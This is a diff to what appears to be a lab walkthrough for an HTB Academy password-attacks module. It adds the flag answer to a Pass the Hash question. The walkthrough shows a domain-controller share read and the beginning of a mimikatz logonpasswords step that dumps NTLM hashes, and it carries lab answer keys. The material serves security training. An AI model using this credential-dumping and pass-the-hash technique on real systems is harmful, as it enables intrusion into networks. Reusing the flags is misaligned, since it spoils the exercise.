@@ -278,7 +278,7 @@ Authenticate to **10.129.15.20** (ACADEMY-PWATTACKS-LM-MS01) with user `Administ
         C:\Windows\system32>type \\DC01\david\david.txt
         D3V1d_Fl5g_is_Her3
         ```
-5. Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt. **Answer:**
+5. Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt. **Answer: JuL1()_SH@re_fl@g**
    - Run mimikatz with `sekurlsa::logonpasswords` module and read the NTLM hash:
         ```cmd
         C:\Tools> mimikatz.exe
